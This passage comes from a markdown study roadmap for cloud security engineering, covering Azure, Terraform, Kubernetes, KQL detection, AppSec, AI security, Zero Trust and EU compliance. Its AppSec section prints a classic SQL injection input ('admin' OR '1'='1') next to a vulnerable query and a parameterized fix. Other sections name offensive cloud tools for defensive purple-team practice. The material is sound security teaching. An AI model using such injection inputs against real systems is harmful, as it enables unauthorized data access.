- [ ] **Practice:** Pick 3 MITRE ATT&CK techniques and describe how you'd detect them

#### Risk Management `🛡️ Sec+`

- [ ] Risk = Likelihood × Impact
- [ ] Risk treatment: Avoid, mitigate, transfer, accept
- [ ] Quantitative vs qualitative risk assessment
- [ ] Risk registers and risk matrices
- [ ] Vulnerability management lifecycle: Discover → Prioritize → Remediate → Verify

> **Resources:**
> - [NIST CSF 2.0](https://www.nist.gov/cyberframework) — Free
> - [MITRE ATT&CK](https://attack.mitre.org/) — Free
> - [CIS Controls](https://www.cisecurity.org/controls) — Free (registration required)

---

### 1.6 Threat Modeling `🛡️ Sec+`

- [ ] **STRIDE:** Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation of Privilege
- [ ] Data Flow Diagrams (DFD): Trust boundaries, data flows, processes, data stores
- [ ] Attack Trees: Hierarchical decomposition of attack goals
- [ ] DREAD scoring (historical awareness): Damage, Reproducibility, Exploitability, Affected Users, Discoverability
- [ ] **Practice:** Create a STRIDE threat model for a simple 3-tier web application
- [ ] **Practice:** Identify trust boundaries in a cloud architecture diagram

> **STRIDE applied to a login page:**
> ```
> Threat             Example                         Mitigation
> ─────────────────────────────────────────────────────────────
> Spoofing           Attacker impersonates user       MFA, strong auth
> Tampering          Modify login request in transit   TLS, input validation
> Repudiation        User denies performing action     Audit logging
> Info Disclosure    Password sent in cleartext        HTTPS, hashing
> Denial of Service  Flood login endpoint              Rate limiting, WAF
> Elevation of Priv  SQL injection to admin access     Parameterized queries
>
> → You will use STRIDE on every portfolio project from Phase 3 onward.
> ```

> **Resources:**
> - Book: *Threat Modeling: Designing for Security* — Adam Shostack
> - [OWASP Threat Modeling](https://owasp.org/www-community/Threat_Modeling) — Free
> - [Microsoft Threat Modeling Tool](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool) — Free

---

### 🎯 Phase 1 Cert Checkpoint: CompTIA Security+ (SY0-701)

> **Target: Month 6–8.** By this point, you've covered all 5 Security+ domains through the sections above.

- [ ] Review [official SY0-701 exam objectives](https://www.comptia.org/certifications/security) — map each to your notes
- [ ] Complete Professor Messer's Security+ course (YouTube, Free)
- [ ] Take at least 3 full-length practice exams, score 85%+ consistently
- [ ] Review PBQ (Performance-Based Question) strategies

> ```
> CompTIA Security+ SY0-701
> ├── 90 questions (multiple choice + PBQs)
> ├── 90 minutes
> ├── Passing: 750 / 900
> ├── Cost: ~€370 (Pearson VUE)
> └── Validity: 3 years
>
> Domain Weights:
>   1. General Security Concepts           12%
>   2. Threats, Vulnerabilities & Attacks   22%
>   3. Security Architecture               18%
>   4. Security Operations                  28%  ← Heaviest!
>   5. Security Program Mgmt & Oversight    20%
> ```

> **Resources:**
> - **Video:** [Professor Messer — SY0-701](https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/sy0-701-comptia-security-plus-course/) — Free complete course
> - **Book:** *CompTIA Security+ Get Certified Get Ahead* — Darril Gibson
> - **Practice exams:** [Jason Dion's Practice Tests](https://www.udemy.com/course/comptia-security-practice-tests/) — Udemy (~€15 on sale)

---

## Phase 2: Cloud Foundations & Security (Month 8-14) — ~250h

> **Goal:** Transition from general security to cloud-specific skills. Build, break, and secure cloud infrastructure.

| Section | Hours | Weeks |
|---------|:-----:|:-----:|
| 2.1 Cloud Fundamentals | 15h | 1.5 |
| 2.2 Azure Admin & Security | 80h | 8 |
| 2.3 Terraform | 50h | 5 |
| 2.4 Container & K8s Security | 60h | 6 |
| 2.5 Cloud Network Security | 30h | 3 |

> **🎯 Cert Milestone:** `🔷 AZ-104` Microsoft Azure Administrator — Target: Month 9–11

---

### 2.1 Cloud Computing Fundamentals

- [ ] Cloud service models: IaaS, PaaS, SaaS — security responsibilities for each
- [ ] Shared Responsibility Model: What the provider secures vs what you secure
- [ ] Cloud deployment models: Public, Private, Hybrid, Multi-Cloud
- [ ] `🔵 VN` Cloud Security Alliance (CSA): Cloud Controls Matrix (CCM), STAR registry
- [ ] Understand the "blast radius" concept

> **Shared Responsibility Model:**
> ```
>                        On-Prem    IaaS     PaaS     SaaS
> ─────────────────────────────────────────────────────────
> Data                   [YOU]     [YOU]    [YOU]    [YOU]
> Access Management      [YOU]     [YOU]    [YOU]    [YOU]
> Application            [YOU]     [YOU]    [YOU]    [CSP]
> OS Patching            [YOU]     [YOU]    [CSP]    [CSP]
> Network Controls       [YOU]     [YOU]    [CSP]    [CSP]
> Hypervisor             [YOU]     [CSP]    [CSP]    [CSP]
> Physical Security      [YOU]     [CSP]    [CSP]    [CSP]
>
> Moving to the cloud doesn't remove responsibility — it SHIFTS it.
> You always own your data and access management.
> ```

> **Resources:**
> - [Azure Fundamentals Learning Path](https://learn.microsoft.com/en-us/training/paths/az-900-describe-cloud-concepts/) — Free
> - [AWS Cloud Practitioner Essentials](https://aws.amazon.com/training/digital/aws-cloud-practitioner-essentials/) — Free
> - Book: *Practical Cloud Security* — Chris Dotson

---

### 2.2 Azure Administration & Security `🔷 AZ-104`

#### Azure Core Services

- [ ] Azure Resource Manager (ARM): How everything in Azure is managed
- [ ] Resource Groups, Subscriptions, Management Groups — the hierarchy
- [ ] Azure Policy: Enforce standards, deny non-compliant resources
- [ ] Tags and naming conventions for governance
- [ ] **Practice:** Create a management group hierarchy with policies that enforce tagging and allowed regions

#### Azure Networking Security

- [ ] Virtual Networks (VNet): Address spaces, subnets, peering
- [ ] Network Security Groups (NSG): Inbound/outbound rules, priority, default rules
- [ ] Application Security Groups (ASG): Logical grouping for NSG rules
- [ ] Azure Firewall: Centralized network filtering, FQDN filtering, threat intelligence
- [ ] Azure DDoS Protection: Basic vs Standard tier
- [ ] Private Endpoints & Private Link: Secure PaaS service access
- [ ] Azure Bastion: Secure RDP/SSH without public IP exposure
- [ ] **Practice:** Build a hub-spoke network topology with Azure Firewall in the hub
- [ ] **Practice:** Configure Private Endpoints for Azure Storage and Key Vault

> **Hub-Spoke Network in Azure:**
> ```
>                    ┌──────────────────┐
>                    │    Hub VNet       │
>                    │  10.0.0.0/16     │
>                    │ ┌──────────────┐ │
>     Internet ──────┤ │ Azure Firewall│ ├─── ExpressRoute → On-Prem
>                    │ └──────────────┘ │
>                    │ ┌──────────────┐ │
>                    │ │ Azure Bastion │ │
>                    │ └──────────────┘ │
>                    └────┬──────┬──────┘
>                    Peering    Peering
>                ┌────┘          └────┐
>     ┌──────────┴─────┐   ┌─────────┴──────┐
>     │ Spoke 1 VNet   │   │ Spoke 2 VNet    │
>     │ 10.1.0.0/16    │   │ 10.2.0.0/16     │
>     │ (Workloads)    │   │ (Data/DBs)      │
>     │ NSG-filtered   │   │ Private Endpoints│
>     └────────────────┘   └─────────────────┘
> ```

#### Azure Identity & Security Services

- [ ] `🟡 SC-300` Microsoft Entra ID: Tenants, users, groups, applications
- [ ] `🟡 SC-300` Conditional Access: Policies, named locations, risk-based access
- [ ] `🟡 SC-300` PIM (Privileged Identity Management): JIT role activation, access reviews
- [ ] `🔷 AZ-104` Azure RBAC: Built-in roles, custom roles, scope (MG → Sub → RG → Resource)
- [ ] `🔷 AZ-104` Managed Identities: System-assigned vs user-assigned
- [ ] `🔷 AZ-104` Azure Key Vault: Secrets, keys, certificates, access policies vs RBAC
- [ ] `🔶 SC-500` Microsoft Defender for Cloud: Security posture, secure score
- [ ] `🔶 SC-500` Microsoft Sentinel: SIEM + SOAR, data connectors, analytics rules
- [ ] **Practice:** Deploy Conditional Access requiring MFA for all admin roles
- [ ] **Practice:** Connect Azure Activity Logs to Sentinel and create an analytics rule

> **Resources:**
> - [Microsoft Learn — AZ-104](https://learn.microsoft.com/en-us/training/courses/az-104t00) — Free
> - [John Savill's Azure Master Class](https://www.youtube.com/playlist?list=PLlVtbbG169nGccbp8VSpAozu3w9xSQJoY) — YouTube (Free, exceptional)
> - Pwned Labs: Azure labs

---

### 2.3 Infrastructure as Code (Terraform) `🟢 TF`

- [ ] Declarative vs imperative IaC
- [ ] HCL syntax: Resources, variables, outputs, locals, data sources
- [ ] Terraform workflow: init → plan → apply → destroy
- [ ] State management: terraform.tfstate, remote backends (Azure Storage, S3)
- [ ] State locking: Why it matters with team collaboration
- [ ] Modules: Reusable, composable infrastructure patterns
- [ ] Providers: azurerm, aws, google, kubernetes

> **Secure Azure Resource Group with Terraform:**
> ```hcl
> resource "azurerm_key_vault" "lab_kv" {
>   name                          = "kv-seclab-${random_string.suffix.result}"
>   location                      = azurerm_resource_group.lab.location
>   resource_group_name           = azurerm_resource_group.lab.name
>   tenant_id                     = data.azurerm_client_config.current.tenant_id
>   sku_name                      = "standard"
>
>   public_network_access_enabled = false          # No public access
>   purge_protection_enabled      = true           # Can't accidentally delete keys
>   soft_delete_retention_days    = 90
>   enable_rbac_authorization     = true           # RBAC > access policies
> }
> ```

#### Terraform Security

- [ ] Secure state: Encrypt at rest, use remote backend with access controls
- [ ] Never commit secrets — use variables, Key Vault references, or env vars
- [ ] `tfsec` / `Checkov` / `Trivy`: Static analysis for Terraform misconfigurations
- [ ] Sentinel (HashiCorp) or OPA: Policy as code
- [ ] **Practice:** Write Terraform for a hub-spoke network with NSGs and firewall rules
- [ ] **Practice:** Run Checkov against your Terraform code and fix all findings

> **Resources:**
> - [HashiCorp Learn — Terraform](https://developer.hashicorp.com/terraform/tutorials) — Free
> - Book: *Terraform: Up & Running* — Yevgeniy Brikman

---

### 2.4 Container & Kubernetes Security `🔵 VN`

#### Container Fundamentals

- [ ] What containers actually are: namespaces, cgroups, union filesystems
- [ ] Docker architecture: Daemon, client, registry, images, containers
- [ ] Dockerfile: FROM, RUN, COPY, CMD, ENTRYPOINT, USER, EXPOSE
- [ ] Image layers and caching
- [ ] Container networking: bridge, host, overlay
- [ ] **Practice:** Build a Docker image for a Python web app, scan it with Trivy

#### Container Security

- [ ] Image security: Minimal base images (distroless, Alpine), multi-stage builds
- [ ] Image scanning: Trivy, Grype, Snyk — CVEs in dependencies and OS packages
- [ ] Never run containers as root — use USER directive
- [ ] Read-only file systems where possible
- [ ] Secrets management: Never bake secrets into images
- [ ] Container escape attacks: The boundary between container and host

> **Secure vs Insecure Dockerfile:**
> ```dockerfile
> # BAD — runs as root, full OS image
> FROM python:3.11
> COPY . /app
> RUN pip install -r /app/requirements.txt
> CMD ["python", "/app/main.py"]
>
> # GOOD — minimal image, non-root user, health check
> FROM python:3.11-slim AS builder
> WORKDIR /app
> COPY requirements.txt .
> RUN pip install --no-cache-dir -r requirements.txt
>
> FROM python:3.11-slim
> RUN groupadd -r appuser && useradd -r -g appuser appuser
> WORKDIR /app
> COPY --from=builder /usr/local/lib/python3.11 /usr/local/lib/python3.11
> COPY . .
> USER appuser
> HEALTHCHECK CMD ["python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:8080/health')"]
> CMD ["python", "main.py"]
> ```

#### Kubernetes Security

- [ ] Kubernetes architecture: Control plane + worker nodes
- [ ] RBAC in Kubernetes: Roles, ClusterRoles, RoleBindings
- [ ] Network Policies: Restrict pod-to-pod communication
- [ ] Pod Security Standards: Privileged, Baseline, Restricted
- [ ] Secrets in Kubernetes: Base64 is NOT encryption — use external secrets operators
- [ ] Service accounts and Workload Identity
- [ ] `🔷 AZ-104` AKS: Integration with Entra ID, Azure Policy for AKS
- [ ] **Practice:** Deploy a simple app to AKS, apply network policies, configure RBAC
- [ ] **Practice:** Scan a cluster with kube-bench (CIS Benchmarks)

> **Resources:**
> - [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/) — Free
> - Book: *Hacking Kubernetes* — Andrew Martin & Michael Hausenblas
> - [KillerCoda](https://killercoda.com/) — Interactive K8s labs (Free)

---

### 2.5 Network Security in the Cloud

- [ ] `🔵 VN` VPC/VNet design patterns: Isolation, segmentation, peering
- [ ] `🔷 AZ-104` Azure Network Watcher: Packet capture, NSG flow logs
- [ ] Micro-segmentation: Network policies, ASGs, service mesh (Istio/Linkerd)
- [ ] Cloud-native firewalls vs virtual appliances (NVAs)
- [ ] DNS security in the cloud: Azure Private DNS, split-horizon DNS
- [ ] TLS inspection in the cloud: Azure Firewall Premium
- [ ] VPN & ExpressRoute: Site-to-site, point-to-site
- [ ] WAF: Azure Front Door WAF, custom rules, bot protection
- [ ] **Practice:** Enable NSG flow logs, analyze traffic patterns, identify anomalies

---

## Phase 3: Cloud Security Engineering (Month 14-20) — ~250h

> **Goal:** Go deep on the pillars that define a Cloud Security Engineer's daily work: detection, identity, application security, and AI security.

| Section | Hours | Weeks |
|---------|:-----:|:-----:|
| 3.1 SecOps & Monitoring | 80h | 8 |
| 3.2 Cloud IAM (Entra ID) | 60h | 6 |
| 3.3 Application Security | 40h | 4 |
| 3.4 DevSecOps & CI/CD | 30h | 3 |
| 3.5 AI Security | 30h | 3 |

> **🎯 Cert Milestones:**
> - `🔶 SC-500` Cloud & AI Security Engineer — Target: Month 14–16
> - `🟡 SC-300` Identity & Access Administrator — Target: Month 16–18

---

### 3.1 Security Operations & Monitoring `🔶 SC-500`

#### KQL (Kusto Query Language)

- [ ] KQL syntax: where, project, summarize, join, parse, extend, render
- [ ] Log sources: SignInLogs, AuditLogs, SecurityAlert, AzureActivity
- [ ] Time-series analysis and anomaly detection in KQL
- [ ] **Practice:** Write 5+ KQL detection queries

> **KQL — Impossible Travel Detection:**
> ```kql
> SignInLogs
> | where ResultType == 0
> | summarize
>     Locations = make_set(Location),
>     IPs = make_set(IPAddress),
>     FirstSignIn = min(TimeGenerated),
>     LastSignIn = max(TimeGenerated)
>     by UserPrincipalName, bin(TimeGenerated, 1h)
> | where array_length(Locations) > 1
> | extend TimeDiffMinutes = datetime_diff('minute', LastSignIn, FirstSignIn)
> | where TimeDiffMinutes < 60
> | project UserPrincipalName, Locations, IPs, TimeDiffMinutes
>
> // Finds users signing in from 2+ locations within 1 hour
> // Classic indicator for stolen credentials
> ```

#### SIGMA Rules

- [ ] SIGMA: Vendor-neutral detection format
- [ ] SIGMA → KQL conversion
- [ ] SIGMA rule structure: title, status, logsource, detection, condition
- [ ] **Practice:** Write 3 SIGMA rules and convert to KQL

#### Microsoft Sentinel & Defender

- [ ] Sentinel: Data connectors, analytics rules, workbooks, playbooks (Logic Apps)
- [ ] Defender suite: Cloud, Endpoint, Identity, Office 365
- [ ] Alert triage: True positive, false positive, benign true positive
- [ ] Threat hunting: Hypothesis-driven, IOC-based, TTP-based
- [ ] MITRE ATT&CK for Cloud: Cloud-specific techniques
- [ ] **Practice:** Hunt for suspicious activity in a Sentinel workspace

#### Incident Response

- [ ] IR lifecycle: Preparation → Detection → Analysis → Containment → Eradication → Recovery → Post-Incident
- [ ] NIST SP 800-61 Rev. 3 — Incident Handling Guide
- [ ] IR in the cloud: Volatile evidence, shared infrastructure, scale
- [ ] Chain of custody for digital evidence
- [ ] Post-incident review / lessons learned
- [ ] **Practice:** Create an IR playbook for "compromised Entra ID account"

> **Resources:**
> - [NIST SP 800-61r3](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r3.pdf) — Free
> - [Microsoft Sentinel Learning Path](https://learn.microsoft.com/en-us/training/paths/sc-200-configure-azure-sentinel/) — Free
> - [KQL Reference](https://learn.microsoft.com/en-us/kusto/query/) — Free
> - Book: *Blue Team Handbook: IR Edition* — Don Murdoch

---

### 3.2 Identity & Access Management (Cloud) `🟡 SC-300`

- [ ] Entra ID deep dive: Authentication flows, token types (ID, access, refresh)
- [ ] Conditional Access advanced: Device compliance, app protection, session controls, CAE
- [ ] Workload Identities: Service principals, managed identities, federated credentials
- [ ] App registrations: Permissions (delegated vs application), consent framework
- [ ] Entra ID Governance: Access reviews, lifecycle workflows, entitlement management
- [ ] Identity Protection: Risk policies, risky users, risky sign-ins
- [ ] Passwordless: FIDO2, Windows Hello, certificate-based auth
- [ ] Cross-tenant access settings: B2B collaboration security
- [ ] Vendor comparison: Entra ID ↔ Okta ↔ Keycloak ↔ AWS IAM Identity Center
- [ ] **Practice:** Set up PIM for Global Admin with approval workflow
- [ ] **Practice:** Build a Python script using Graph API for identity governance checks

> **Resources:**
> - [Microsoft Learn — SC-300](https://learn.microsoft.com/en-us/training/courses/sc-300t00) — Free
> - Book: *Identity Attack Vectors* — Roger Grimes

---

### 3.3 Application Security

- [ ] **OWASP Top 10:** Know all 10 categories and mitigations
- [ ] **OWASP Top 10 for LLM Applications:** Prompt injection, insecure output handling, etc.
- [ ] Secure SDLC: Where security fits in each phase
- [ ] SAST (Semgrep, CodeQL), DAST (ZAP, Burp Suite), SCA (dependency scanning, SBOM)
- [ ] API Security: Authentication, rate limiting, input validation
- [ ] **Practice:** Find and exploit OWASP Top 10 vulns in [DVWA](https://github.com/digininja/DVWA) or [Juice Shop](https://owasp.org/www-project-juice-shop/)

> **SQL Injection — still one of the most common root causes:**
> ```python
> # VULNERABLE — string concatenation
> query = "SELECT * FROM users WHERE username = '" + user_input + "'"
> # user_input = "admin' OR '1'='1"  →  returns ALL users!
>
> # SAFE — parameterized query
> query = "SELECT * FROM users WHERE username = %s"
> cursor.execute(query, (user_input,))
> # Database treats user_input as DATA, never as SQL code
> ```

> **Resources:**
> - [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free interactive labs (excellent!)
> - Book: *The Web Application Hacker's Handbook* — Stuttard & Pinto

---

### 3.4 DevSecOps & CI/CD Security

- [ ] CI/CD pipeline security: Secrets management, least privilege for pipelines, signed commits
- [ ] GitHub Actions security: `GITHUB_TOKEN` permissions, OIDC for Azure
- [ ] Secret scanning: GitHub Secret Scanning, TruffleHog
- [ ] Dependency management: Dependabot, supply chain attacks (typosquatting)
- [ ] Container image pipeline: Build → Scan → Sign → Push → Deploy
- [ ] `🟢 TF` IaC security scanning: tfsec, Checkov, KICS
- [ ] **Practice:** Build a GitHub Actions pipeline with Checkov + Trivy + secrets scanning

> **Secure GitHub Actions Workflow:**
> ```yaml
> name: Security Pipeline
> on: [push, pull_request]
>
> permissions:
>   contents: read         # Minimum permissions!
>   security-events: write
>
> jobs:
>   security-scan:
>     runs-on: ubuntu-latest
>     steps:
>       - uses: actions/checkout@v4
>
>       - name: Scan IaC with Checkov
>         uses: bridgecrewio/checkov-action@v12
>         with:
>           directory: ./terraform
>           soft_fail: false         # Fail on findings!
>
>       - name: Scan for secrets
>         uses: trufflesecurity/trufflehog@main
>         with:
>           extra_args: --only-verified
>
>       - name: Scan Docker image
>         uses: aquasecurity/trivy-action@master
>         with:
>           image-ref: 'myapp:${{ github.sha }}'
>           severity: 'CRITICAL,HIGH'
>           exit-code: '1'
> ```

---

### 3.5 AI Security

- [ ] **OWASP LLM Top 10:** Prompt Injection, Insecure Output Handling, Training Data Poisoning, etc.
- [ ] **MITRE ATLAS:** AI-specific tactics and techniques
- [ ] Prompt injection: Direct vs indirect, jailbreaking, data exfiltration
- [ ] AI governance frameworks: EU AI Act, NIST AI RMF, CSA MAESTRO
- [ ] Securing AI workloads: Model access control, inference endpoint security
- [ ] `🔶 SC-500` Microsoft Defender for AI: Monitoring AI workloads in Azure
- [ ] **Practice:** Test prompt injection attacks against a sandboxed LLM ([Gandalf](https://gandalf.lakera.ai/), HackAPrompt)
- [ ] **Practice:** Design a security architecture for an enterprise RAG application

> **Resources:**
> - [OWASP LLM Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — Free
> - [MITRE ATLAS](https://atlas.mitre.org/) — Free
> - [EU AI Act](https://artificialintelligenceact.eu/) — Free

---

## Phase 4: Advanced Architecture & Governance (Month 20-26) — ~250h

> **Goal:** Think like an architect. Design security solutions, not just implement them.

| Section | Hours | Weeks |
|---------|:-----:|:-----:|
| 4.1 Zero Trust Architecture | 50h | 5 |
| 4.2 Data Protection & Encryption | 40h | 4 |
| 4.3 CSPM | 40h | 4 |
| 4.4 Multi-Cloud & Sovereign Cloud | 50h | 5 |
| 4.5 Compliance & Governance | 50h | 5 |

> **🎯 Cert Milestone:** `🔵 VN` CCSK (Certificate of Cloud Security Knowledge) — Target: Month 22–24

---

### 4.1 Zero Trust Architecture

- [ ] Zero Trust principles: Verify explicitly, use least privilege, assume breach
- [ ] NIST SP 800-207 — Zero Trust Architecture reference
- [ ] Microsoft Zero Trust model: Identity, Endpoints, Applications, Data, Infrastructure, Network
- [ ] ZTNA: Replace VPN with identity-aware proxies
- [ ] Continuous Access Evaluation (CAE): Real-time policy enforcement
- [ ] Micro-segmentation in practice
- [ ] **Practice:** Design and implement a Zero Trust architecture for a 3-tier application in Azure
- [ ] **Practice:** Run a Zero Trust assessment against an Azure tenant

> **Zero Trust Decision Flow:**
> ```
> Access Request (User/Workload → Resource)
>     │
>     ├── Verify Identity
>     │   ├── Who are you? (Entra ID, MFA)
>     │   ├── Is your credential compromised? (Identity Protection)
>     │   └── Is your session still valid? (CAE)
>     │
>     ├── Verify Device
>     │   ├── Is device compliant? (Intune)
>     │   ├── Is device managed? (Entra joined)
>     │   └── Is device health good? (no malware, patched)
>     │
>     ├── Verify Context
>     │   ├── Where? (Named locations, country)
>     │   ├── When? (Business hours?)
>     │   └── What? (Which app/resource?)
>     │
>     ├── Apply Least Privilege
>     │   ├── RBAC, PIM for admins
>     │   ├── Conditional Access policies
>     │   └── Session controls (limited, no download)
>     │
>     └── Monitor & Respond
>         ├── Log everything (Sentinel)
>         ├── Anomaly detection (UEBA)
>         └── Automated response (revoke, block)
> ```

> **Resources:**
> - [NIST SP 800-207](https://csrc.nist.gov/publications/detail/sp/800-207/final) — Free
> - [Microsoft Zero Trust Guidance](https://learn.microsoft.com/en-us/security/zero-trust/) — Free
> - Book: *Zero Trust Networks* — Gilman & Barth

---

### 4.2 Data Protection & Encryption at Scale

- [ ] Data classification: Public, Internal, Confidential, Highly Confidential
- [ ] Encryption at rest: Azure SSE, BitLocker, LUKS
- [ ] Encryption in transit: TLS 1.3, mTLS, IPsec
- [ ] Encryption in use: Confidential computing, Azure Confidential VMs
- [ ] Key Vault deep dive: HSM-backed keys, key rotation automation
- [ ] Microsoft Purview: DLP, Information Protection, Data Lifecycle Management
- [ ] Database encryption: TDE, Always Encrypted, Dynamic Data Masking
- [ ] Tokenization vs encryption
- [ ] **Practice:** Implement sensitivity labels + DLP policies
- [ ] **Practice:** Set up automatic key rotation in Key Vault

---

### 4.3 Cloud Security Posture Management `🔶 SC-500`

- [ ] Defender for Cloud: Secure Score, recommendations, regulatory compliance dashboards
- [ ] `🔵 VN` Third-party CSPM: Wiz, Prisma Cloud, Orca — understand the landscape
- [ ] CIS Benchmarks for Azure/AWS/GCP
- [ ] Attack path analysis: How misconfigurations chain together
- [ ] CWPP (Cloud Workload Protection Platform)
- [ ] `🟢 TF` Policy as Code: Azure Policy, OPA/Gatekeeper, Sentinel
- [ ] **Practice:** Achieve 90%+ Secure Score in a test Azure subscription

---

### 4.4 Multi-Cloud & Sovereign Cloud

- [ ] `🔵 VN` AWS security: IAM, VPC, Security Groups, CloudTrail, GuardDuty, Config
- [ ] `🔵 VN` GCP security: IAM, VPC, Cloud Armor, Security Command Center
- [ ] Multi-cloud identity federation
- [ ] EU sovereign cloud: Gaia-X, Microsoft Cloud for Sovereignty, Confidential Cloud
- [ ] Data residency and data sovereignty: Legal requirements in the EU
- [ ] **Practice:** Deploy a workload in AWS, connect monitoring to Azure Sentinel (multi-cloud SIEM)

---

### 4.5 Compliance & Governance (DORA, NIS2, C5)

- [ ] **DORA:** ICT risk management, incident reporting, resilience testing, third-party risk
- [ ] **NIS2 Directive:** Network and information security for critical infrastructure
- [ ] **EU AI Act:** Risk-based classification, requirements for high-risk AI
- [ ] **GDPR/DSGVO:** Processing principles, legal bases, DPIAs
- [ ] **BSI C5:** Cloud Computing Compliance Criteria Catalogue
- [ ] Cloud provider compliance: SOC 2 Type II, ISO 27001, CSA STAR
- [ ] Third-party risk management: Vendor assessments, SLA security
- [ ] Audit preparation: Evidence collection, control documentation, gap analysis
- [ ] **Practice:** Map Azure security controls to DORA requirements

> **DORA → Azure Mapping (simplified):**
> ```
> DORA Requirement                → Azure Control
> ───────────────────────────────────────────────────────
> ICT Risk Management (Art. 5-16)  → Defender for Cloud, Azure Policy
> Incident Reporting (Art. 17-23)  → Sentinel, Logic Apps, Service Health
> Resilience Testing (Art. 24-27)  → Chaos Studio, DR drills
> Third-Party Risk (Art. 28-44)    → Defender for Cloud Apps, SLA monitoring
> Info Sharing (Art. 45)           → Sentinel TI connectors, ISACs
> ```

> **Resources:**
> - [DORA Full Text](https://eur-lex.europa.eu/eli/reg/2022/2554/oj) — Free
> - [BSI C5](https://www.bsi.bund.de/EN/Topics/CloudComputing/Compliance_Criteria_Catalogue/Compliance_Criteria_Catalogue_node.html) — Free
> - *CSA Security Guidance v4* — Free from CSA

---

## Phase 5: Expert Topics & Capstone (Month 26-30) — ~200h

> **Goal:** Become the person who designs security strategy, not just implements it.

| Section | Hours | Weeks |
|---------|:-----:|:-----:|
| 5.1 Security Architecture Design | 50h | 5 |
| 5.2 Offensive Cloud Security | 40h | 4 |
| 5.3 Cloud Incident Response | 50h | 5 |
| 5.4 Leadership & Communication | 20h | (ongoing) |

> **🎯 Cert Milestones:**
> - `🟢 TF` HashiCorp Terraform Associate — Target: Month 27–28
> - `🔵 VN` Optional: CKS (Certified Kubernetes Security) or CCSP — Target: Month 29–30

---

### 5.1 Security Architecture Design

- [ ] Architecture review methodology: Threat model, control mapping, residual risk
- [ ] Landing Zone design: Azure CAF, AWS Control Tower
- [ ] Network architecture patterns: Hub-spoke, Virtual WAN, mesh
- [ ] Identity architecture: Centralized IdP, federation, B2B/B2C
- [ ] HA/DR: RPO, RTO, active-active, active-passive
- [ ] Security documentation: Architecture Decision Records (ADRs)
- [ ] **Practice:** Design a complete security architecture for a fictional regulated company
- [ ] **Practice:** Present the architecture and defend your design decisions

> **Security Architecture Review Checklist:**
> ```
> □ Identity
>   □ Centralized identity provider (Entra ID)
>   □ MFA for all users, passwordless for admins
>   □ Conditional Access policies defined
>   □ PIM for all privileged roles
>   □ Service principals use managed identities
>
> □ Network
>   □ Hub-spoke or Virtual WAN topology
>   □ NSGs on all subnets with deny-all default
>   □ Private endpoints for all PaaS services
>   □ WAF in front of all internet-facing endpoints
>   □ DDoS protection enabled
>
> □ Data
>   □ Classification scheme defined and enforced
>   □ Encryption at rest (customer-managed keys where required)
>   □ Encryption in transit (TLS 1.2+)
>   □ Immutable backups
>   □ DLP policies for sensitive data
>
> □ Compute
>   □ CIS-hardened images for VMs
>   □ Container images scanned and signed
>   □ Pod Security Standards (Restricted)
>   □ Patch management automated
>
> □ Operations
>   □ Centralized logging (Sentinel)
>   □ Detection rules for top MITRE ATT&CK techniques
>   □ IR playbooks for top 5 scenarios
>   □ Regular access reviews
>   □ Weekly vulnerability scanning
> ```

---

### 5.2 Offensive Cloud Security (Purple Team Perspective)

> Not about becoming a pentester. It's about understanding attacker techniques to build better defenses.

- [ ] Cloud pentesting methodology: Recon, initial access, privilege escalation, lateral movement, exfiltration
- [ ] Azure attacks: Token theft, managed identity abuse, storage misconfiguration, RBAC escalation
- [ ] Common misconfigurations: Public blobs, overprivileged identities, missing encryption, exposed secrets
- [ ] Tools: ROADtools, AzureHound, BloodHound, GraphRunner, ScubaGear
- [ ] **Practice:** Complete 10+ [Pwned Labs](https://pwnedlabs.io) offensive labs
- [ ] **Practice:** After each offensive lab, write the corresponding detection rule in KQL

---

### 5.3 Incident Response in Cloud Environments

- [ ] Cloud-specific IR: Ephemeral resources, shared infrastructure, scale
- [ ] Azure IR: VM isolation, token revocation, key rotation at scale
- [ ] AWS IR: CloudTrail analysis, GuardDuty findings, EC2 forensic isolation
- [ ] Evidence preservation: Disk snapshots, memory dumps, log export before retention expires
- [ ] Ransomware response: Immutable backups, blast radius assessment
- [ ] **Practice:** Write a full IR playbook for "compromised Azure service principal"

---

### 5.4 Leadership & Communication for Security Architects

- [ ] Communicating risk to non-technical stakeholders
- [ ] Writing security architecture decision documents
- [ ] Building a business case for security investments
- [ ] Running security workshops and awareness sessions
- [ ] Influencing without authority: Getting dev teams to adopt security

---

## Certification Roadmap

> Hybrid approach: Cert topics are tagged throughout the plan. Exams are milestones, not goals.
> **Ratio: 3 Microsoft : 3 Vendor-neutral** — designed to avoid vendor lock-in signaling.

```
✅ COMPLETED:
  ☁️  AZ-900   — Azure Fundamentals                              ✅ Done
  🔒  SC-900   — Security, Compliance, and Identity Fundamentals  ✅ Done

PHASE 1 (Month 1–8):
  📋  SEC1     — TryHackMe Security Engineer           → Month 1–4
  🛡️  Sec+     — CompTIA Security+ (SY0-701)           → Month 6–8

PHASE 2 (Month 8–14):
  🔷  AZ-104   — Azure Administrator Associate         → Month 9–11

PHASE 3 (Month 14–20):
  🔶  SC-500   — Cloud & AI Security Engineer           → Month 14–16
  🟡  SC-300   — Identity & Access Administrator        → Month 16–18

PHASE 4 (Month 20–26):
  🔵  CCSK     — Certificate of Cloud Security Knowledge → Month 22–24

PHASE 5 (Month 26–30):
  🟢  TF       — HashiCorp Terraform Associate          → Month 27–28
  🔵  CKS/CCSP — Kubernetes Security or Cloud Pro       → Month 29–30 (optional)
```

### Bonus: Microsoft Applied Skills Credentials

Shorter, scenario-based assessments that prove hands-on skills. No dedicated study time — attach these to light weeks.

| Credential | When | Prep |
|-----------|------|------|
| Secure storage for Azure Files and Blob Storage | Phase 2–3 | ~4h |
| Configure SIEM operations using Microsoft Sentinel | Phase 3 | ~4h |
| Deploy and configure Azure Firewall | Phase 3 | ~3h |

---

## Books

### Must-Read (Priority Order)

| # | Title | Author(s) | Focus | When |
|---|-------|-----------|-------|------|
| 1 | *CompTIA Security+ Study Guide* | Chapple & Seidl | Exam prep + foundations | Phase 1 |
| 2 | *Serious Cryptography* | Jean-Philippe Aumasson | Applied cryptography | Phase 1 |
| 3 | *Practical Packet Analysis* | Chris Sanders | Wireshark + networking | Phase 1 |
